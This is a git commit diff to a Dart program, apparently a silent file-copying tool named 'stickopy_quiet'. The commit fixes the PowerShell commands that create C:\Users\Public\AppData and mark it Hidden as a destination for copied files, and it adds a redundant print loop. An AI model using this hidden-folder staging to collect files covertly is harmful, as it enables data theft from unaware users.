8f6c0c79241cebb31d7a531ae9ded7298a3bd971
Firmin L <45711398+firmin-launay@users.noreply.github.com>
2021-02-05 18:09:12 +0100

    Fix PowerShell commands

--- stickopy_quiet/main.dart
+++ stickopy_quiet/main.dart
@@ -2,13 +2,14 @@ import "dart:io";
 import "dart:convert";
 
 main() {
-  Process.run('mkdir', [
-    "C:\\Users\\Public\\AppData"
+  Process.run("powershell", [
+    "-command",
+    "New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\AppData"
   ]); // Create folder where files will be copied.
 
-  Process.run('powershell', [
-    '-command',
-    "\"\$f=get-item C:\Users\Public\AppData -Force;\$f.attributes='Hidden'\""
+  Process.run("powershell", [
+    "-command",
+    "\$f=get-item C:\\Users\\Public\\AppData -Force;\$f.attributes='Hidden'"
   ]); // Set the folder as hidden.
 
   Process.run(
@@ -20,5 +21,14 @@ main() {
     LineSplitter ls = new LineSplitter();
     List<String> lines = ls.convert(output);
     print(lines);
+    String line;
+    for (line in lines) {
+      if (line == "") {
+        //lines.remove(line);
+        print(lines);
+      } else {
+        print(lines);
+      }
+    }
   });
 }
